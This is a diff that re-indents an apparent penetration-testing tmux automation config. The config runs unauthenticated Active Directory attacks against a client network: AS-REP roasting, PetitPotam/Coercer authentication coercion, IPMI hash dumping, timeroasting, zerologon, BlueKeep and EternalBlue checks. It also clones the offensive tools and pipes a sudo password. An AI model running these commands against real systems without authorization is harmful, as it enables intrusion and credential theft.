@@ -40,26 +40,26 @@ windows:
         - echo <%= @settings["nomadPass"] %> | sudo -S su
         - <%= @settings["prefill"] %> 'sudo nmap -sC -sV -T4 -O -sS -vvv -p- -iL <%= @settings["rootDir"] %>/ipList.txt --excludefile /RSM/exclude.txt --exclude-ports $(cat <%= @settings["rootDir"] %>scans/nmap/LIST-top-4000-ports.txt) -oA <%= @settings["rootDir"] %>/scans/all-tcp-after-4000'; clear
   - services: 
-    panes:
-      - dns:
-        - tmux select-pane -T 'dnsrecon' -t "unauthd:services.0"
-        - dnsrecon -d <%= @settings["domain"] %> -t axfr
-      - ftp:
-        - tmux select-pane -T 'ftp' -t "unauthd:services.1"
-        - cat <%= @settings["rootDir"] %>/scans/masscanPortList/ftp.lst && msfconsole -q -x "workspace -a <%= @settings["msfWorkspace"] %>; use auxiliary/scanner/ftp/anonymous; set rhosts file:<%= @settings["rootDir"] %>/scans/masscanPortList/ftp.lst; spool <%= @settings["rootDir"] %>/scans/ftpAnon.txt; run; spool off; exit"
-      - snmp:
-        - tmux select-pane -T 'snmp' -t "unauthd:services.2"
-        - cat <%= @settings["rootDir"] %>/scans/masscanPortList/snmp.lst && msfconsole -q -x "workspace -a <%= @settings["msfWorkspace"] %>; use auxiliary/scanner/snmp/snmp_login; set rhosts file:<%= @settings["rootDir"] %>/scans/masscanPortList/snmp.lst; spool <%= @settings["rootDir"] %>/scans/snmpLogin.txt; run; spool off; exit"
-      - IPMI Cipher Zero:
-        - tmux select-pane -T 'IPMI Cipher Zero' -t "unauthd:services.3"
-        - cat <%= @settings["rootDir"] %>/scans/masscanPortList/ipmi.lst && mkdir -p <%= @settings["rootDir"] %>/loot/ipmi
-        - cat <%= @settings["rootDir"] %>/scans/masscanPortList/ipmi.lst && msfconsole -q -x 'use auxiliary/scanner/ipmi/ipmi_version; set RHOSTS file:/<%= @settings["rootDir"] %>/scans/masscanPortList/ipmi.lst; spool <%= @settings["rootDir"] %>/scans/ipmi/ipmi_version.txt; run; spool off; exit'
-        - cat <%= @settings["rootDir"] %>/scans/masscanPortList/ipmi.lst && msfconsole -q -x 'use auxiliary/scanner/ipmi/ipmi_dumphashes; set OUTPUT_HASHCAT_FILE /<%= @settings["rootDir"] %>/loot/ipmi/ipmiHashes.hashcat; set OUTPUT_JOHN_FILE /<%= @settings["rootDir"] %>/loot/ipmi/ipmiHashes.john; set RHOSTS file:/<%= @settings["rootDir"] %>/scans/masscanPortList/ipmi.lst; spool <%= @settings["rootDir"] %>/scans/ipmi_dumphashes.txt; run; spool off; exit'
-        - cat <%= @settings["rootDir"] %>/scans/masscanPortList/ipmi.lst && msfconsole -q -x 'use auxiliary/scanner/ipmi/ipmi_cipher_zero; set RHOSTS file:/<%= @settings["rootDir"] %>/scans/masscanPortList/ipmi.lst; spool <%= @settings["rootDir"] %>/scans/ipmi/ipmi_cipher_zero.txt; run; spool off; exit'
-        - wc -l <%= @settings["rootDir"] %>/scans/ipmi/*
-      - printers:
-        - tmux select-pane -T 'printers' -t "unauthd:services.4"
-        - msfconsole -q -x "workspace -a <%= @settings['msfWorkspace'] %>; services -u -S 'print'"
+      panes:
+        - dns:
+          - tmux select-pane -T 'dnsrecon' -t "unauthd:services.0"
+          - dnsrecon -d <%= @settings["domain"] %> -t axfr
+        - ftp:
+          - tmux select-pane -T 'ftp' -t "unauthd:services.1"
+          - cat <%= @settings["rootDir"] %>/scans/masscanPortList/ftp.lst && msfconsole -q -x "workspace -a <%= @settings["msfWorkspace"] %>; use auxiliary/scanner/ftp/anonymous; set rhosts file:<%= @settings["rootDir"] %>/scans/masscanPortList/ftp.lst; spool <%= @settings["rootDir"] %>/scans/ftpAnon.txt; run; spool off; exit"
+        - snmp:
+          - tmux select-pane -T 'snmp' -t "unauthd:services.2"
+          - cat <%= @settings["rootDir"] %>/scans/masscanPortList/snmp.lst && msfconsole -q -x "workspace -a <%= @settings["msfWorkspace"] %>; use auxiliary/scanner/snmp/snmp_login; set rhosts file:<%= @settings["rootDir"] %>/scans/masscanPortList/snmp.lst; spool <%= @settings["rootDir"] %>/scans/snmpLogin.txt; run; spool off; exit"
+        - IPMI Cipher Zero:
+          - tmux select-pane -T 'IPMI Cipher Zero' -t "unauthd:services.3"
+          - cat <%= @settings["rootDir"] %>/scans/masscanPortList/ipmi.lst && mkdir -p <%= @settings["rootDir"] %>/loot/ipmi
+          - cat <%= @settings["rootDir"] %>/scans/masscanPortList/ipmi.lst && msfconsole -q -x 'use auxiliary/scanner/ipmi/ipmi_version; set RHOSTS file:/<%= @settings["rootDir"] %>/scans/masscanPortList/ipmi.lst; spool <%= @settings["rootDir"] %>/scans/ipmi/ipmi_version.txt; run; spool off; exit'
+          - cat <%= @settings["rootDir"] %>/scans/masscanPortList/ipmi.lst && msfconsole -q -x 'use auxiliary/scanner/ipmi/ipmi_dumphashes; set OUTPUT_HASHCAT_FILE /<%= @settings["rootDir"] %>/loot/ipmi/ipmiHashes.hashcat; set OUTPUT_JOHN_FILE /<%= @settings["rootDir"] %>/loot/ipmi/ipmiHashes.john; set RHOSTS file:/<%= @settings["rootDir"] %>/scans/masscanPortList/ipmi.lst; spool <%= @settings["rootDir"] %>/scans/ipmi_dumphashes.txt; run; spool off; exit'
+          - cat <%= @settings["rootDir"] %>/scans/masscanPortList/ipmi.lst && msfconsole -q -x 'use auxiliary/scanner/ipmi/ipmi_cipher_zero; set RHOSTS file:/<%= @settings["rootDir"] %>/scans/masscanPortList/ipmi.lst; spool <%= @settings["rootDir"] %>/scans/ipmi/ipmi_cipher_zero.txt; run; spool off; exit'
+          - wc -l <%= @settings["rootDir"] %>/scans/ipmi/*
+        - printers:
+          - tmux select-pane -T 'printers' -t "unauthd:services.4"
+          - msfconsole -q -x "workspace -a <%= @settings['msfWorkspace'] %>; services -u -S 'print'"
   - SMB/nullSesh:
       layout: 1eb3,115x27,0,0[115x13,0,0,0,115x13,0,14{57x13,0,14,1,57x13,58,14,2}]
       pre: mkdir -p <%= @settings["rootDir"] %>/scans/smb/enum4linux; cd <%= @settings["rootDir"] %>/scans/smb
@@ -77,59 +77,59 @@ windows:
           # alternatively could wait and run against smb_null_logon file from cme
           - for i in $(cat <%= @settings["rootDir"] %>/scans/masscanPortList/smb.lst); do echo ""; echo "Testing:$i"; enum4linux -a $i | tee /RSM/scans/smb/enum4linux/enum4linux-$i.txt; done
   - ASREProast: 
-    panes:
-      - ASREP roast:
-        - tmux select-pane -T 'ASREP roast' -t "unauthd:ASREProast.0"
-        - rm -rf /opt/nomad-tools/impacket || git clone https://github.com/fortra/impacket.git /opt/nomad-tools/impacket 
-        - docker build -t "impacket:latest" /opt/nomad-tools/impacket
-        - docker run -it --name newest_impacket -v /RSM/:/RSM --rm "impacket:latest"
-        - <%= @settings["prefill"] %> 'GetNPUsers.py <%= @settings["domain"] %>/ -dc-ip $(cat <%= @settings["rootDir"] %>/dcIP.txt | head -n 1) -no-pass -usersfile <%= @settings["rootDir"] %>/usernames.txt -outputfile <%= @settings["rootDir"] %>/scans/unauthd-asrepRoast.txt -format john'; clear
+      panes:
+        - ASREP roast:
+          - tmux select-pane -T 'ASREP roast' -t "unauthd:ASREProast.0"
+          - rm -rf /opt/nomad-tools/impacket || git clone https://github.com/fortra/impacket.git /opt/nomad-tools/impacket 
+          - docker build -t "impacket:latest" /opt/nomad-tools/impacket
+          - docker run -it --name newest_impacket -v /RSM/:/RSM --rm "impacket:latest"
+          - <%= @settings["prefill"] %> 'GetNPUsers.py <%= @settings["domain"] %>/ -dc-ip $(cat <%= @settings["rootDir"] %>/dcIP.txt | head -n 1) -no-pass -usersfile <%= @settings["rootDir"] %>/usernames.txt -outputfile <%= @settings["rootDir"] %>/scans/unauthd-asrepRoast.txt -format john'; clear
   - coercAuth: 
-    layout: 786e,113x25,0,0[113x10,0,0,23,113x14,0,11{56x14,0,11,37,56x14,57,11,41}]
-    panes:
-      - cme petit:
-        - tmux select-pane -T 'cme petit' -t "unauthd:coercAuth.0"
-        - crackmapexec smb $(cat <%= @settings["rootDir"] %>/dcIP.txt | head -n 1) -u '' -p '' -d <%= @settings["domain"] %> -M petitpotam | tee <%= @settings["rootDir"] %>/scans/petitpotam-unauthd.txt
-      - PetitPotam.py:
-        - tmux select-pane -T 'PetitPotam.py' -t "unauthd:coercAuth.1"
-        - cd /opt/nomad-tools/PetitPotam || (git clone https://github.com/topotam/PetitPotam.git /opt/nomad-tools/PetitPotam && cd /opt/nomad-tools/PetitPotam)
-        - nomadIP=$(ip a | grep "eth0" -A 3 | grep -oP "inet .*\/" | grep -oP "[0-9\.]+")
-        - python3 PetitPotam.py -u '' -p '' -d <%= @settings["domain"] %> $nomadIP $(cat /RSM/dcIP.txt | head -n 1)
-        - echo "Note eth0 is the default nomadIP used; modify nomadIP as needed"
-      - Coercer:
-        - tmux select-pane -T 'Coercer' -t "unauthd:coercAuth.2"
-        - cd /opt/nomad-tools/Coercer || (git clone https://github.com/p0dalirius/Coercer.git /opt/nomad-tools/Coercer && cd /opt/nomad-tools/Coercer && pipenv install)
-        - nomadIP=$(ip a | grep "eth0" -A 3 | grep -oP "inet .*\/" | grep -oP "[0-9\.]+")
-        - pipenv run python3 Coercer.py coerce -l $nomadIP -t $(cat /RSM/dcIP.txt | head -n 1) -u "" -p "" -d <%= @settings["domain"] %> -v
-        - echo "Note eth0 is the default nomadIP used; modify nomadIP as needed"
+      layout: 786e,113x25,0,0[113x10,0,0,23,113x14,0,11{56x14,0,11,37,56x14,57,11,41}]
+      panes:
+        - cme petit:
+          - tmux select-pane -T 'cme petit' -t "unauthd:coercAuth.0"
+          - crackmapexec smb $(cat <%= @settings["rootDir"] %>/dcIP.txt | head -n 1) -u '' -p '' -d <%= @settings["domain"] %> -M petitpotam | tee <%= @settings["rootDir"] %>/scans/petitpotam-unauthd.txt
+        - PetitPotam.py:
+          - tmux select-pane -T 'PetitPotam.py' -t "unauthd:coercAuth.1"
+          - cd /opt/nomad-tools/PetitPotam || (git clone https://github.com/topotam/PetitPotam.git /opt/nomad-tools/PetitPotam && cd /opt/nomad-tools/PetitPotam)
+          - nomadIP=$(ip a | grep "eth0" -A 3 | grep -oP "inet .*\/" | grep -oP "[0-9\.]+")
+          - python3 PetitPotam.py -u '' -p '' -d <%= @settings["domain"] %> $nomadIP $(cat /RSM/dcIP.txt | head -n 1)
+          - echo "Note eth0 is the default nomadIP used; modify nomadIP as needed"
+        - Coercer:
+          - tmux select-pane -T 'Coercer' -t "unauthd:coercAuth.2"
+          - cd /opt/nomad-tools/Coercer || (git clone https://github.com/p0dalirius/Coercer.git /opt/nomad-tools/Coercer && cd /opt/nomad-tools/Coercer && pipenv install)
+          - nomadIP=$(ip a | grep "eth0" -A 3 | grep -oP "inet .*\/" | grep -oP "[0-9\.]+")
+          - pipenv run python3 Coercer.py coerce -l $nomadIP -t $(cat /RSM/dcIP.txt | head -n 1) -u "" -p "" -d <%= @settings["domain"] %> -v
+          - echo "Note eth0 is the default nomadIP used; modify nomadIP as needed"
   - bigName: 
-    panes:
-      - zerologon:
-        - tmux select-pane -T 'zerologon' -t "unauthd:bigName.0"
-        - cd /opt/nomad-tools/CVE-2020-1472 || (git clone https://github.com/SecuraBV/CVE-2020-1472.git /opt/nomad-tools/CVE-2020-1472 && cd /opt/nomad-tools/CVE-2020-1472/ && pipenv install)
-        - dig any _kerberos._tcp.<%= @settings["domain"] %>
-        - <%= @settings["prefill"] %> 'pipenv run zerologon_tester.py $DC-netbiosName $(cat <%= @settings["rootDir"] %>/dcIP.txt | head -n 1) | tee <%= @settings["rootDir"] %>/scans/zerologon.txt'; echo -e "\e[0;31mIF VULNERABLE INFORM CLIENT & TECH LEAD\033[0m"
-      - blueKeep:
-        - tmux select-pane -T 'blueKeep' -t "unauthd:bigName.1"
-        - cat <%= @settings["rootDir"] %>/scans/masscanPortList/rdp.lst && msfconsole -q -x "workspace -a <%= @settings["msfWorkspace"] %>; use scanner/rdp/cve_2019_0708_bluekeep; set rhosts file:<%= @settings["rootDir"] %>/scans/masscanPortList/rdp.lst; spool <%= @settings["rootDir"] %>/scans/blueKeep.txt; run; spool off; exit"; echo -e "\e[0;31mIF VULNERABLE INFORM CLIENT & TECH LEAD\033[0m"
-      - eternalBlue:
-        - tmux select-pane -T 'eternalBlue' -t "unauthd:bigName.2"
-        - cat <%= @settings["rootDir"] %>/scans/masscanPortList/smb.lst && msfconsole -q -x "workspace -a <%= @settings["msfWorkspace"] %>; use scanner/smb/smb_ms17_010; set rhosts file:<%= @settings["rootDir"] %>/scans/masscanPortList/smb.lst; spool <%= @settings["rootDir"] %>/scans/eternalBlue.txt; run; spool off; exit"; echo -e "\e[0;31mAVOID RUNNING ON CRITICAL SYSTEMS\033[0m"
+      panes:
+        - zerologon:
+          - tmux select-pane -T 'zerologon' -t "unauthd:bigName.0"
+          - cd /opt/nomad-tools/CVE-2020-1472 || (git clone https://github.com/SecuraBV/CVE-2020-1472.git /opt/nomad-tools/CVE-2020-1472 && cd /opt/nomad-tools/CVE-2020-1472/ && pipenv install)
+          - dig any _kerberos._tcp.<%= @settings["domain"] %>
+          - <%= @settings["prefill"] %> 'pipenv run zerologon_tester.py $DC-netbiosName $(cat <%= @settings["rootDir"] %>/dcIP.txt | head -n 1) | tee <%= @settings["rootDir"] %>/scans/zerologon.txt'; echo -e "\e[0;31mIF VULNERABLE INFORM CLIENT & TECH LEAD\033[0m"
+        - blueKeep:
+          - tmux select-pane -T 'blueKeep' -t "unauthd:bigName.1"
+          - cat <%= @settings["rootDir"] %>/scans/masscanPortList/rdp.lst && msfconsole -q -x "workspace -a <%= @settings["msfWorkspace"] %>; use scanner/rdp/cve_2019_0708_bluekeep; set rhosts file:<%= @settings["rootDir"] %>/scans/masscanPortList/rdp.lst; spool <%= @settings["rootDir"] %>/scans/blueKeep.txt; run; spool off; exit"; echo -e "\e[0;31mIF VULNERABLE INFORM CLIENT & TECH LEAD\033[0m"
+        - eternalBlue:
+          - tmux select-pane -T 'eternalBlue' -t "unauthd:bigName.2"
+          - cat <%= @settings["rootDir"] %>/scans/masscanPortList/smb.lst && msfconsole -q -x "workspace -a <%= @settings["msfWorkspace"] %>; use scanner/smb/smb_ms17_010; set rhosts file:<%= @settings["rootDir"] %>/scans/masscanPortList/smb.lst; spool <%= @settings["rootDir"] %>/scans/eternalBlue.txt; run; spool off; exit"; echo -e "\e[0;31mAVOID RUNNING ON CRITICAL SYSTEMS\033[0m"
   - ldapSigning: 
-    panes:
-      - ldapSigning:
-        - tmux select-pane -T 'ldapSigning' -t "unauthd:ldapSigning.0"
-        - cd /opt/nomad-tools/LdapRelayScan || git clone https://github.com/zyn3rgy/LdapRelayScan.git /opt/nomad-tools/LdapRelayScan
-        # have to modify the requirements.txt due to issue tracked in ldaprelayscan with libcrypto here: https://github.com/zyn3rgy/LdapRelayScan/issues/21
-        - cd /opt/nomad-tools/LdapRelayScan && echo "git+https://github.com/wbond/oscrypto.git@d5f3437" >> requirements.txt; pipenv run pip install -r requirements.txt --force-reinstall
-        # have to set pipenv install to --skip-lock due to dependency issue
-        - mkdir -p <%= @settings["rootDir"] %>/scans/ldap && cd /opt/nomad-tools/LdapRelayScan && pipenv install --skip-lock; clear
-        - pipenv run python3 LdapRelayScan.py -method LDAPS -dc-ip $(cat <%= @settings["rootDir"] %>/dcIP.txt | head -n 1) | tee <%= @settings["rootDir"] %>/scans/ldap/ldapSigning-unauthd.txt
+      panes:
+        - ldapSigning:
+          - tmux select-pane -T 'ldapSigning' -t "unauthd:ldapSigning.0"
+          - cd /opt/nomad-tools/LdapRelayScan || git clone https://github.com/zyn3rgy/LdapRelayScan.git /opt/nomad-tools/LdapRelayScan
+          # have to modify the requirements.txt due to issue tracked in ldaprelayscan with libcrypto here: https://github.com/zyn3rgy/LdapRelayScan/issues/21
+          - cd /opt/nomad-tools/LdapRelayScan && echo "git+https://github.com/wbond/oscrypto.git@d5f3437" >> requirements.txt; pipenv run pip install -r requirements.txt --force-reinstall
+          # have to set pipenv install to --skip-lock due to dependency issue
+          - mkdir -p <%= @settings["rootDir"] %>/scans/ldap && cd /opt/nomad-tools/LdapRelayScan && pipenv install --skip-lock; clear
+          - pipenv run python3 LdapRelayScan.py -method LDAPS -dc-ip $(cat <%= @settings["rootDir"] %>/dcIP.txt | head -n 1) | tee <%= @settings["rootDir"] %>/scans/ldap/ldapSigning-unauthd.txt
   - timeroast: 
-    panes:
-      - timeroast:
-        - tmux select-pane -T 'timeroast' -t "unauthd:timeroast.0"
-        - cd /opt/nomad-tools/Timeroast || git clone https://github.com/SecuraBV/Timeroast.git /opt/nomad-tools/Timeroast
-        - cd /opt/nomad-tools/Timeroast && mkdir -p <%= @settings["rootDir"] %>/loot/timeroast
-        - echo <%= @settings["nomadPass"] %> | sudo -S su; clear
-        - sudo python3 timeroast.py $(cat <%= @settings["rootDir"] %>/dcIP.txt | head -n 1) | tee <%= @settings["rootDir"] %>/loot/timeroast/timeroast-ntp-hashes.txt
+      panes:
+        - timeroast:
+          - tmux select-pane -T 'timeroast' -t "unauthd:timeroast.0"
+          - cd /opt/nomad-tools/Timeroast || git clone https://github.com/SecuraBV/Timeroast.git /opt/nomad-tools/Timeroast
+          - cd /opt/nomad-tools/Timeroast && mkdir -p <%= @settings["rootDir"] %>/loot/timeroast
+          - echo <%= @settings["nomadPass"] %> | sudo -S su; clear
+          - sudo python3 timeroast.py $(cat <%= @settings["rootDir"] %>/dcIP.txt | head -n 1) | tee <%= @settings["rootDir"] %>/loot/timeroast/timeroast-ntp-hashes.txt
